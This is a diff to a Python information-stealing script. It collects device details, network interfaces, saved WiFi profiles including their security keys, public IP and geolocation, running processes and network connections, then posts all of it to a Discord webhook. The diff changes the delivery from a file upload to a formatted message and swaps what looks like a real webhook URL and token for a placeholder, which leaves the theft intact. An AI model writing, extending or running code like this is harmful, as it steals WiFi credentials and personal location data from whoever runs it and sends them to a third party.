@@ -5,20 +5,21 @@ import platform
 import socket
 import os
 import netifaces
+import re
 
 # Discord Webhook URL
-webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
+webhook_url = 'https://discord.com/api/webhooks/your_webhook_url_here'
 
 # Function to send message to Discord webhook
-def send_to_discord(file_path):
-    with open(file_path, 'rb') as f:
-        files = {'file': f}
-        response = requests.post(webhook_url, files=files)
-        if response.status_code == 204:
-            print("File sent successfully to Discord webhook.")
-        else:
-            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
-            print(f"Response: {response.text}")
+def send_to_discord(message):
+    payload = {'content': message}
+    headers = {'Content-Type': 'application/json'}
+    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+    if response.status_code == 204:
+        print("Message sent successfully to Discord webhook.")
+    else:
+        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
+        print(f"Response: {response.text}")
 
 # Function to execute command and capture output
 def execute_command(command):
@@ -178,56 +179,61 @@ cpu_info = get_cpu_info()
 running_processes = get_running_processes()
 network_connections = get_network_connections()
 
-# Write collected information to log.txt
-log_file_path = 'log.txt'
-with open(log_file_path, 'w') as f:
-    f.write("=== Device Information ===\n")
-    for key, value in device_info.items():
-        f.write(f"{key.capitalize()}: {value}\n")
-    f.write("\n")
+# Format information for Discord message
+message = (
+    f"**Device Information**\n"
+    f"Hostname: {device_info['Hostname']}\n"
+    f"Platform: {device_info['Platform']} {device_info['Platform Release']} ({device_info['Architecture']})\n"
+    f"Processor: {device_info['Processor']}\n"
+    f"Python Version: {device_info['Python Version']}\n\n"
+    
+    f"**Network Interfaces**\n"
+)
+for iface, info in network_interfaces.items():
+    message += f"Interface: {iface}\n"
+    if 'IPv4' in info:
+        for addr in info['IPv4']:
+            message += f"IPv4 Address: {addr['addr']} ({addr['netmask']})\n"
+    if 'IPv6' in info:
+        for addr in info['IPv6']:
+            message += f"IPv6 Address: {addr['addr']} ({addr.get('netmask', 'N/A')})\n"
+    message += "\n"
 
-    f.write("=== Network Interfaces ===\n")
-    for iface, info in network_interfaces.items():
-        f.write(f"Interface: {iface}\n")
-        if 'IPv4' in info:
-            for addr in info['IPv4']:
-                f.write(f"IPv4 Address: {addr['addr']}\n")
-                f.write(f"Netmask: {addr['netmask']}\n")
-        if 'IPv6' in info:
-            for addr in info['IPv6']:
-                f.write(f"IPv6 Address: {addr['addr']}\n")
-                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
-        f.write("\n")
+message += "**Saved WiFi Profiles**\n"
+for profile in saved_wifi_profiles:
+    message += f"SSID: {profile['SSID']}\n"
+    if 'Security Key' in profile:
+        message += f"Security Key: {profile['Security Key']}\n"
+    if 'IP Address' in profile:
+        message += f"IP Address: {profile['IP Address']}\n"
+    message += "\n"
 
-    f.write("=== Saved WiFi Profiles ===\n")
-    for profile in saved_wifi_profiles:
-        f.write(f"SSID: {profile['SSID']}\n")
-        if 'Security Key' in profile:
-            f.write(f"Security Key: {profile['Security Key']}\n")
-        if 'IP Address' in profile:
-            f.write(f"IP Address: {profile['IP Address']}\n")
-        f.write("\n")
+message += (
+    f"**Public IP and Location**\n"
+    f"Public IP Address: {public_ip}\n"
+)
+if 'error' in location_info:
+    message += f"Location Information: {location_info['error']}\n"
+else:
+    message += f"Location: {location_info.get('city', 'Unknown')}, {location_info.get('region', 'Unknown')}, {location_info.get('country', 'Unknown')}\n"
+message += f"Address: {address}\n\n"
 
-    f.write("=== Public IP and Location ===\n")
-    f.write(f"Public IP Address: {public_ip}\n")
-    if 'error' in location_info:
-        f.write(f"Location Information: {location_info['error']}\n")
-    else:
-        for key, value in location_info.items():
-            f.write(f"{key.capitalize()}: {value}\n")
-    f.write(f"Address: {address}\n")
-    f.write("\n")
+message += (
+    f"**Storage Information**\n"
+    f"{storage_info}\n\n"
+    
+    f"**Memory Information**\n"
+    f"{memory_info}\n\n"
+    
+    f"**CPU Information**\n"
+    f"{cpu_info}\n\n"
+    
+    f"**Running Processes**\n"
+    f"{running_processes}\n\n"
+    
+    f"**Network Connections**\n"
+    f"{network_connections}\n"
+)
 
-    f.write("=== Storage Information ===\n")
-    f.write(f"{storage_info}\n")
-
-    f.write("=== Memory Information ===\n")
-    f.write(f"{memory_info}\n")
-
-    f.write("=== CPU Information ===\n")
-    f.write(f"{cpu_info}\n")
-
-    f.write("=== Running Processes ===\n")
-    f.write(f"{running_processes}\n")
-
-    f.write
+# Send message to Discord webhook
+send_to_discord(message)
